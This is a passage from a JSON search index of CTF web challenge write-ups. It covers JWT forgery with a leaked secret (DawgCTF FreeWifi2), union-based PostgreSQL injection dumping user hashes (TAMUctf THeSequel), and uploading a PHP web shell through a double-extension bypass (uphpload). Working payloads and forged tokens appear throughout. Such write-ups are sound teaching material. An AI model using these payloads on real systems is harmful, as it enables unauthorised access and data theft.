session=eyJjc3JmX3Rva2VuIjoiY2MwZjFmODY4ZWRiOTgzNTUxYzBhM2FiMzFmNDExODJiY2ViYTA5MyJ9.XpGbsA.Afj_d2U1FAfOy_LNDW-ucVcxN94; WifiKey nonce=MjAyMC0wNC0xMSAxMDozOA==; WifiKey alg=SHA1 Upgrade-Insecure-Requests: 1 csrf_token=ImNjMGYxZjg2OGVkYjk4MzU1MWMwYTNhYjMxZjQxMTgyYmNlYmEwOTMi.XpGeNA.1eSf_9aW6Z1u9djuBDm_N9KhO8M&username=true.grit%40umbccd.io&password=true.grit%40umbccd.io&submit=Submit HTTP Response: HTTP/1.1 200 OK Server: nginx/1.14.0 (Ubuntu) Date: Sat, 11 Apr 2020 10:39:07 GMT Content-Type: text/html; charset=utf-8 Connection: close Set-Cookie: WifiKey nonce=MjAyMC0wNC0xMSAxMDozOQ==; Path=/ Set-Cookie: WifiKey alg=SHA1; Path=/ Set-Cookie: JWT 'identity'=31337; Path=/ Vary: Cookie Content-Length: 2666","title":"FreeWifi2"},{"location":"web/DawgCTF20/freewifi2/#ideas","text":"I think the goal is to login with /jwtlogin We have identity from the above request. In addition, there is additional information from the pcap about a secret: Set-Cookie: JWT 'secret'=\"dawgCTF?heckin#bamboozle\"; Path=/ Using, this two values, I tried creating a JWT token using python. import jwt print jwt.encode({'identity':31337,'exp':1614291780,'iat':1475878357,'nbf':1475878357},'dawgCTF?heckin#bamboozle',algorithm='HS256') eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE0NzU4NzgzNTcsImV4cCI6MTYxNDI5MTc4MCwiaWRlbnRpdHkiOjMxMzM3LCJuYmYiOjE0NzU4NzgzNTd9.ij7mhvj4dBoqFP91aItAp-TMHkaCbOq9tjyV43dP8AA Below is the request that gave me the flag: HTTP Request GET /jwtlogin HTTP/1.1 Host: freewifi.ctf.umbccd.io User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Authorization: JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE0NzU4NzgzNTcsImV4cCI6MTYxNDI5MTc4MCwiaWRlbnRpdHkiOjMxMzM3LCJuYmYiOjE0NzU4NzgzNTd9.ij7mhvj4dBoqFP91aItAp-TMHkaCbOq9tjyV43dP8AA Connection: keep-alive Upgrade-Insecure-Requests: 1 Content-Length: 2 You have the flag in the reponse. DawgCTF{y0u_d0wn_w!t#_JWT?}","title":"Ideas:"},{"location":"web/TAMUctf2021/API2%3ATHE%20SEQUEL/THeSequel/","text":"This challenge was related to simple PostgreSQL. injection The VERSION() function returns the current version of the MySQL database, as a string which let's us know it's postgresql \"https://shell.tamuctf.com/problem/50034/?name=Cone%27%20union%20select%20%271%27,%20%272%27,%20%27safe%27,(CASE%20WHEN%20((SELECT%20CAST(CHR(32)\" we get the respective output from this. invalid input syntax for type numeric: \" 1 Default safe default testing icon avatar 2 Teddy euclid To please the teddy, one must offer them a sacrifice of your finest tea teddy 3 Traffic Cone #88192 neutralized We believe they appear from interdimensional rifts with no clear origin cone 4 Gnomial thaumiel If encountered in the wild do not make eye contact. They only become more aggressive. gnome 5 A\u0337\u030c\u0343d\u0334\u0357\u0352d\u0338\u035b\u035bi\u0337\u034b\u0303s\u0335\u0307\u030do\u0338\u031b\u0312n\u0336\u0307\u030c apollyon H\u0335\u0314\u0302E\u0335\u0307\u0308 \u0334\u031b\u033dI\u0335\u0358\u035bS\u0337\u0352\u0307 \u0337\u0344\u0312A\u0337\u030f\u035aL\u0334\u0340\u033fR\u0334\u033e\u030cE\u0337\u031a\u0346A\u0336\u0304\u031bD\u0337\u0312\u0310Y\u0336\u0357\u034c \u0337\u030f\u0314H\u0336\u033f\u031aE\u0336\u0303\u0304R\u0337\u0344\u035dE\u0338\u030a\u0344 crump 1 glenn 9651cbc7c0b5fb1a81f2858a07813c82 Making More Challenges 2 teddy e2ec2b31abe380b989ff057aef66377a PWNing Away 3 admin gigem{SQL_1nj3ct1ons_c4n_b3_fun} Away on Vacation \" as we can see the user name is thaumiel and hence we include it in our payload payload=\"Cone%27+Union+select+1,password,%27thaumiel%27,%27d%27,%27a%27+from+users--\" it allows to execute a fully formatted subquery within the injected part, which technically has almost the same impact as interacting with a pure PostgreSQL database. gigem{SQL_1nj3ct1ons_c4n_b3_fun}","title":"THeSequel"},{"location":"web/TAMUctf2021/uphpload/uphpload/","text":"uphpload Description Solution The webpage allows us to upload images and view them. This immediately suggests a file upload vulnerability. The page only accepts image files. This can be bypassed using a double extension. Upload a PHP script to search for flag.txt file: <?php print shell_exec('find / -name \"flag.txt\"'); ?> Click on the file in uploads to run the script. This gives us the flag location. Now upload a script to print the flag: <?php print shell_exec('cat /flag_is_here/flag.txt'); ?>","title":"uphpload"},{"location":"web/TAMUctf2021/uphpload/uphpload/#uphpload","text":"","title":"uphpload"},{"location":"web/TAMUctf2021/uphpload/uphpload/#description","text":"","title":"Description"},{"location":"web/TAMUctf2021/uphpload/uphpload/#solution","text":"The webpage allows us to upload images and view them. This immediately suggests a file upload vulnerability. The page only accepts image files. This can be bypassed using a double extension. Upload a PHP script to search for flag.txt file: <?php print shell_exec('find / -name \"flag.txt\"'); ?> Click on the file in uploads to run the script. This gives us the flag location. Now upload a script to print the flag: <?php print shell_exec('cat /flag_is_here/flag.txt'); ?>","title":"Solution"}]}